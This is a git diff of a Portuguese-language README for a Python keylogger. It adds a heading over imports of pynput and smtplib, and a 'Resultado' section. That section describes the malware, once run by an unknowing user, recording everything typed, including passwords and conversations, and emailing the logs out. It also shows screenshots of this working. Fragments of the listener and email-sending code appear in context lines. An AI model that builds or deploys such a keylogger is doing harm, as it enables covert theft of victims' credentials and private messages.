@@ -246,7 +246,7 @@ Keylogger é um tipo de software malicioso que captura tudo o que o usuário dig
 
 ---
 
-## 
+## Importar as bibliotecas
 
 `from pynput import keyboard 
 import smtplib
@@ -315,8 +315,23 @@ SENHA = "XXX XXX XXX XXXX"`
     enviar_email()  # Inicia o envio periódico de emails
     listener.join()`
 
+---
 
-      
+# Resultado
+
+Assim que o usuário recebe o malware sem saber do que se trata e for executado ele começa a captura e registra as teclas digitadas ( executando ) A partir de agora o Malware captura e registra as teclas digitadas pelo usuario conversas senhas etc...
+
+
+<img width="850" height="498" alt="image" src="https://github.com/user-attachments/assets/7c72ee98-d3bf-447f-b657-9f580e43aa53" />
+
+---  
+
+
+<img width="805" height="382" alt="image" src="https://github.com/user-attachments/assets/27e52e73-ce26-4eb0-b1c5-2f84c430d6f7" /> </n>
+
+
+
+Nas imagens acima, observa-se que, logo após a execução do malware, ele passou a capturar e registrar as teclas digitadas e a enviar os registros por e-mail.
 
 
 
